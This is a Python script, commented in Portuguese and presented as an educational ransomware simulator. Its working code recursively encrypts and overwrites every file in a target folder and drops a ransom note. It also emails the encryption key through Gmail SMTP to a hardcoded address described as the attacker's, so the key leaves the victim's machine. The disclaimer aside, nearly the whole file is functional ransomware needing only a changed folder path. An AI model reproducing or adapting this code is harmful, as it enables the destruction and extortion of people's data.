import os
import smtplib
from email.mime.text import MIMEText
from cryptography.fernet import Fernet

# -------------------------------------------------------------------------
# AVISO LEGAL / DISCLAIMER
# Este código foi desenvolvido APENAS para fins educacionais e de aprendizado.
# A execução deste script em sistemas ou arquivos sem autorização é ILEGAL.
# O autor não se responsabiliza pelo uso indevido deste código.
# -------------------------------------------------------------------------

class Ransomware:
    def __init__(self, target_dir="target_folder", email="upperprovedor@gmail.com", password="YOUR_APP_PASSWORD_HERE"):
        self.target_dir = target_dir
        self.key = None
        self.encrypted_files = []
        self.email = email
        self.password = password

    def generate_key(self):
        """Gera uma chave de criptografia, salva em arquivo e envia por e-mail."""
        self.key = Fernet.generate_key()
        with open("chave.key", "wb") as key_file:
            key_file.write(self.key)
        print("[+] Chave gerada e salva como 'chave.key'.")
        self.send_key_via_email()

    def send_key_via_email(self):
        """Envia a chave gerada para o e-mail do atacante."""
        if not self.key:
            return
        
        try:
            message = f"Chave de descriptografia gerada: {self.key.decode()}"
            msg = MIMEText(message)
            msg['Subject'] = f"Ransomware Notification - Key Generated"
            msg['From'] = self.email
            msg['To'] = self.email

            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(self.email, self.password)
            server.send_message(msg)
            server.quit()
            print("[+] Chave enviada por e-mail com sucesso.")
        except Exception as e:
            print(f"[-] Falha ao enviar chave por e-mail: {e}")

    def load_key(self, key_file="chave.key"):
        """Carrega a chave de criptografia de um arquivo."""
        try:
            with open(key_file, "rb") as kf:
                self.key = kf.read()
            print("[+] Chave carregada com sucesso.")
        except FileNotFoundError:
            print("[-] Arquivo de chave não encontrado.")

    def encrypt_files(self):
        """Criptografa os arquivos no diretório alvo."""
        if not self.key:
            print("[-] Chave não carregada. Gere ou carregue uma chave primeiro.")
            return

        fernet = Fernet(self.key)
        
        for root, dirs, files in os.walk(self.target_dir):
            for file in files:
                if file == "ransomware.pyw" or file == "chave.key" or file.endswith(".encrypted"):
                    continue
                
                file_path = os.path.join(root, file)
                
                try:
                    with open(file_path, "rb") as f:
                        file_data = f.read()
                    
                    encrypted_data = fernet.encrypt(file_data)
                    
                    with open(file_path, "wb") as f:
                        f.write(encrypted_data)
                    
                    print(f"[!] Criptografado: {file_path}")
                except Exception as e:
                    print(f"[-] Erro ao criptografar {file_path}: {e}")

        self.create_ransom_note()

    def decrypt_files(self):
        """Descriptografa os arquivos no diretório alvo."""
        if not self.key:
            print("[-] Chave não carregada. Carregue a chave primeiro.")
            return

        fernet = Fernet(self.key)

        for root, dirs, files in os.walk(self.target_dir):
            for file in files:
                if file == "ransomware.pyw" or file == "chave.key" or file == "LEIA_ME.txt":
                    continue

                file_path = os.path.join(root, file)

                try:
                    with open(file_path, "rb") as f:
                        file_data = f.read()
                    
                    decrypted_data = fernet.decrypt(file_data)
                    
                    with open(file_path, "wb") as f:
                        f.write(decrypted_data)
                        
                    print(f"[+] Descriptografado: {file_path}")
                except Exception as e:
                    print(f"[-] Erro ao descriptografar {file_path} (pode não estar criptografado ou chave errada).")

    def create_ransom_note(self):
        """Cria o arquivo de mensagem de resgate."""
        note = """
        SEUS ARQUIVOS FORAM CRIPTOGRAFADOS!
        
        Para recuperá-los, você precisa da chave de descriptografia.
        Este é apenas um teste educacional.
        
        Não pague nada a ninguém.
        """
        with open(os.path.join(self.target_dir, "LEIA_ME.txt"), "w") as note_file:
            note_file.write(note)
        print("[!] Nota de resgate criada: LEIA_ME.txt")

def main():
    ransom = Ransomware(target_dir="target_folder")
    
    print("--- Simulador de Ransomware ---")
    print("1. Gerar Chave (e enviar por e-mail)")
    print("2. Criptografar Arquivos")
    print("3. Descriptografar Arquivos")
    print("4. Sair")
    
    while True:
        choice = input("\nEscolha uma opção: ")
        
        if choice == "1":
            ransom.generate_key()
        elif choice == "2":
            ransom.load_key() # Tenta carregar caso já exista, ou usa a gerada na memória
            ransom.encrypt_files()
        elif choice == "3":
            ransom.load_key()
            ransom.decrypt_files()
        elif choice == "4":
            break
        else:
            print("Opção inválida.")

if __name__ == "__main__":
    main()
